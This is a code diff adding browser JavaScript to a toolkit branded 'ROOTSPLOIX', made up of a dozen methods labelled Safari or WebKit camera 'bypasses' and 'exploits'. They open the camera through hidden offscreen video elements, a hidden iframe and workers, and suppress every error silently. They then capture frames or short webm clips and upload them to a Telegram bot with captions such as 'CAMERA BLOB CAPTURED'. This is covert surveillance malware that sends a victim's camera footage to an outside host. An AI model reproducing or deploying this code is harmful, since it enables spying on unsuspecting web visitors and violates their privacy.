@@ -2162,6 +2162,407 @@ ${topHotspots.join('\n')}
                 }
             }
             
+            // ===== WEBKIT GETUSERMEDIA BYPASSES (ACTUAL IMPLEMENTATIONS) =====
+            async webkitGetUserMediaBypass1() {
+                // Method 1: WebKit constraint manipulation
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { min: 1, ideal: 1, max: 1 },
+                            height: { min: 1, ideal: 1, max: 1 },
+                            frameRate: { min: 0.1, ideal: 0.1, max: 0.1 },
+                            facingMode: 'user'
+                        },
+                        audio: false
+                    });
+                    await this.processMediaStream(stream, 'WebKit Constraint Bypass #1');
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass2() {
+                // Method 2: WebKit legacy API fallback
+                try {
+                    if (navigator.webkitGetUserMedia) {
+                        navigator.webkitGetUserMedia(
+                            { video: true, audio: false },
+                            (stream) => {
+                                this.processMediaStream(stream, 'WebKit Legacy API #2');
+                            },
+                            (error) => { /* Silent fail */ }
+                        );
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass3() {
+                // Method 3: WebKit permission state exploit
+                try {
+                    if (navigator.permissions) {
+                        const result = await navigator.permissions.query({ name: 'camera' });
+                        if (result.state === 'granted' || result.state === 'prompt') {
+                            const stream = await navigator.mediaDevices.getUserMedia({
+                                video: { deviceId: 'default' }
+                            });
+                            await this.processMediaStream(stream, 'WebKit Permission State #3');
+                        }
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass4() {
+                // Method 4: WebKit MediaStream constructor exploit
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                    
+                    if (videoDevices.length > 0) {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                deviceId: { exact: videoDevices[0].deviceId },
+                                width: 640,
+                                height: 480
+                            }
+                        });
+                        await this.processMediaStream(stream, 'WebKit MediaStream Constructor #4');
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass5() {
+                // Method 5: WebKit cross-origin iframe exploit
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = 'data:text/html,<script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>parent.postMessage({type:"stream",stream:s},"*"))</script>';
+                    iframe.style.display = 'none';
+                    iframe.sandbox = 'allow-scripts allow-same-origin';
+                    
+                    const messageHandler = (event) => {
+                        if (event.data && event.data.type === 'stream') {
+                            this.processMediaStream(event.data.stream, 'WebKit Cross-Origin Iframe #5');
+                            window.removeEventListener('message', messageHandler);
+                            document.body.removeChild(iframe);
+                        }
+                    };
+                    
+                    window.addEventListener('message', messageHandler);
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                            window.removeEventListener('message', messageHandler);
+                        }
+                    }, 5000);
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass6() {
+                // Method 6: WebKit getUserMedia with fake constraints
+                try {
+                    const constraints = {
+                        video: {
+                            mandatory: {
+                                minWidth: 1,
+                                minHeight: 1,
+                                maxWidth: 1,
+                                maxHeight: 1,
+                                minFrameRate: 0.1,
+                                maxFrameRate: 0.1
+                            },
+                            optional: []
+                        },
+                        audio: false
+                    };
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    await this.processMediaStream(stream, 'WebKit Fake Constraints #6');
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass7() {
+                // Method 7: WebKit worker-based camera access
+                try {
+                    const workerScript = `
+                        navigator.mediaDevices.getUserMedia({video: true})
+                        .then(stream => {
+                            self.postMessage({type: 'success', streamId: 'worker-stream'});
+                        })
+                        .catch(err => {
+                            self.postMessage({type: 'error', error: err.message});
+                        });
+                    `;
+                    
+                    const blob = new Blob([workerScript], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    
+                    worker.onmessage = (event) => {
+                        if (event.data.type === 'success') {
+                            // Worker camera access detected
+                            const msg = `✅ WebKit Worker Camera Access #7 - ${event.data.streamId}`;
+                            this.reportCameraAttempt(msg);
+                        }
+                        worker.terminate();
+                    };
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass8() {
+                // Method 8: WebKit video element srcObject exploit
+                try {
+                    const video = document.createElement('video');
+                    video.autoplay = true;
+                    video.muted = true;
+                    video.style.position = 'absolute';
+                    video.style.top = '-9999px';
+                    video.style.left = '-9999px';
+                    video.style.width = '1px';
+                    video.style.height = '1px';
+                    video.style.opacity = '0';
+                    
+                    document.body.appendChild(video);
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { width: 1, height: 1, frameRate: 0.1 }
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    video.addEventListener('loadedmetadata', () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 1;
+                            canvas.height = 1;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, 1, 1);
+                            
+                            const imageData = canvas.toDataURL();
+                            this.processCameraData(imageData, 'WebKit Video srcObject #8');
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                        }, 1000);
+                    });
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass9() {
+                // Method 9: WebKit MediaRecorder exploit
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { min: 1, ideal: 320, max: 1920 },
+                            height: { min: 1, ideal: 240, max: 1080 },
+                            frameRate: { min: 0.1, ideal: 1, max: 30 }
+                        }
+                    });
+                    
+                    if (MediaRecorder.isTypeSupported('video/webm')) {
+                        const recorder = new MediaRecorder(stream, {
+                            mimeType: 'video/webm',
+                            videoBitsPerSecond: 1000
+                        });
+                        
+                        const chunks = [];
+                        recorder.ondataavailable = (event) => {
+                            if (event.data.size > 0) {
+                                chunks.push(event.data);
+                            }
+                        };
+                        
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            this.processCameraBlob(blob, 'WebKit MediaRecorder #9');
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 1000);
+                    }
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitGetUserMediaBypass10() {
+                // Method 10: WebKit canvas captureStream exploit
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Draw something to trigger stream
+                    ctx.fillStyle = '#000000';
+                    ctx.fillRect(0, 0, 640, 480);
+                    ctx.fillStyle = '#ffffff';
+                    ctx.fillText('WebKit Test', 10, 30);
+                    
+                    if (canvas.captureStream) {
+                        const stream = canvas.captureStream(1); // 1 FPS
+                        
+                        // Try to get real camera stream and overlay
+                        try {
+                            const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                            const video = document.createElement('video');
+                            video.srcObject = cameraStream;
+                            video.play();
+                            
+                            video.onloadedmetadata = () => {
+                                const drawFrame = () => {
+                                    ctx.drawImage(video, 0, 0, 640, 480);
+                                    setTimeout(drawFrame, 1000);
+                                };
+                                drawFrame();
+                            };
+                            
+                            this.processMediaStream(stream, 'WebKit Canvas CaptureStream #10');
+                        } catch (e) {
+                            // Use canvas stream anyway
+                            this.processMediaStream(stream, 'WebKit Canvas Only #10');
+                        }
+                    }
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            // ===== WEBKIT VIDEO ELEMENT EXPLOITS =====
+            async webkitVideoExploit1() {
+                // Video element autoplay exploit
+                try {
+                    const video = document.createElement('video');
+                    video.autoplay = true;
+                    video.muted = true;
+                    video.playsInline = true;
+                    video.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: 1, height: 1 }
+                    });
+                    
+                    video.srcObject = stream;
+                    document.body.appendChild(video);
+                    
+                    await video.play();
+                    
+                    setTimeout(() => {
+                        this.captureVideoFrame(video, stream, 'WebKit Video Autoplay #1');
+                    }, 500);
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async webkitVideoExploit2() {
+                // Video element with blob URL
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        chunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const blobUrl = URL.createObjectURL(blob);
+                        
+                        const video = document.createElement('video');
+                        video.src = blobUrl;
+                        video.style.display = 'none';
+                        document.body.appendChild(video);
+                        
+                        video.onloadeddata = () => {
+                            this.captureVideoFrame(video, null, 'WebKit Video Blob URL #2');
+                            URL.revokeObjectURL(blobUrl);
+                            document.body.removeChild(video);
+                        };
+                    };
+                    
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                    
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            // ===== HELPER METHODS =====
+            captureVideoFrame(video, stream, method) {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    this.processCameraData(imageData, method);
+                    
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    if (document.body.contains(video)) {
+                        document.body.removeChild(video);
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+            
+            async processCameraBlob(blob, method) {
+                try {
+                    ROOTSPLOIX_SESSION.statistics.cameraCount++;
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', ROOTSPLOIX_CONFIG.telegram.chatId);
+                    formData.append('video', blob, `camera_${Date.now()}.webm`);
+                    formData.append('caption', `📹 CAMERA BLOB CAPTURED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🔧 Method: ${method}
+💾 Size: ${Math.round(blob.size / 1024)}KB
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX SAFARI EXPLOIT`);
+                    
+                    const response = await fetch(`${ROOTSPLOIX_CONFIG.telegram.apiUrl}${ROOTSPLOIX_CONFIG.telegram.botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        const successMsg = `✅ SAFARI CAMERA VIDEO SENT!
+
+🎯 Method: ${method}
+📹 Type: Video blob
+💾 Size: ${Math.round(blob.size / 1024)}KB
+
+💀 ROOTSPLOIX SUCCESS!`;
+                        await telegram.sendMessage(successMsg);
+                    }
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Process camera blob failed', error);
+                }
+            }
+            
+            async reportCameraAttempt(message) {
+                try {
+                    const attemptMsg = `🔍 SAFARI CAMERA ATTEMPT!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📝 Details: ${message}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX SAFARI EXPLOIT`;
+                    
+                    await telegram.sendMessage(attemptMsg);
+                } catch (e) { /* Silent fail */ }
+            }
+            }
+            
             async stealthScreenCapture() {
                 try {
                     // Advanced DOM-based screen capture - NO PERMISSIONS NEEDED
